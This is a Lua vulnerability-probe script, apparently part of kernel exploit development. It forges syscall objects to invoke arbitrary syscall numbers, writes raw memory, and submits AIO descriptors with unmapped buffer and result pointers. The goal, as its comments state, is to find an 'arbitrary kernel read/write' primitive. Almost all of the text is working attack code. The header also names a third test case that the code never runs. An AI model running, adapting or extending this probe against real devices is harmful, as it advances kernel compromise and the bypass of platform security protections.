-- CRASH_CLASS: HIGH
-- PROBE 744a: are the aio descriptor pointers validated?
--
-- A block create copies count*0x28 descriptor bytes into kernel memory and then
-- submits a real socket read (731a/743a: poll 2). The worker dereferences the
-- descriptor's buffer (+0x10) and result (+0x18) as raw pointers after that copy.
-- If nothing revalidates them, they are an arbitrary kernel read/write source.
--
-- A: control, valid buffer and result
-- B: buffer at an unmapped address
-- C: result at an unmapped address
-- Result pointer values tell us whether the kernel checked or faulted.

print("=== PROBE 744a: AIO DESCRIPTOR POINTERS ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local sc_write = mk(6); local sc_pair = mk(135)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn_ud = syscall.pipe.fn_addr
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(uint64(a1), uint64(a2), uint64(a3), uint64(a4), uint64(a5), uint64(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
print("[A] pid="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))

local fds = to_num(memory.alloc(64)); wq(fds, uint64(0))
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, fds, 0, 0)))
local fd = rd(fds); local peer = rd(fds+4)
print(string.format("[A] fd=%d peer=%d", fd, peer))

local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000)); local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400))
zero(D,0x4000); zero(buf,0x4000); zero(res,0x4000); zero(st,0x400)
local w = to_num(memory.alloc(64))
local payload = {0x45454545,0x46464646,0x47474747,0x48484848}
for k=0,3 do wd(w+k*4, payload[k+1]) end

local function desc(at, b, r)
    wq(at+0x00, uint64(0)); wq(at+0x08, uint64(16))
    wq(at+0x10, uint64(b)); wq(at+0x18, uint64(r))
    wd(at+0x20, fd); wd(at+0x24, 0)
end

local function attempt(tag, b, r)
    zero(D,0x100); desc(D, b, r)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return end
    sleep_ms(20)
    wd(ids, id)
    call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state before feed=%08X", tag, rd(st)))
    print(string.format("%s write -> %s", tag, tostring(call(sc_write, peer, w, 16, 0, 0, 0))))
    sleep_ms(60)
    call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state after feed=%08X", tag, rd(st)))
    print(string.format("%s res: %X %X %X %X", tag, rd(r), rd(r+4), rd(r+8), rd(r+12)))
    print(string.format("%s buf: %X %X %X %X", tag, rd(b), rd(b+4), rd(b+8), rd(b+12)))
    wd(ids, id)
    print(string.format("%s delete -> status=%08X", tag, (function() local ds=to_num(memory.alloc(16)); call(mk(662), ids, 1, ds, 0, 0, 0); return rd(ds) end)()))
end

attempt("[A] control", buf, res)
print("[A] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
attempt("[B] unmapped buf", 0x1000, res)
print("[B] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
print("=== 744a DONE ===")
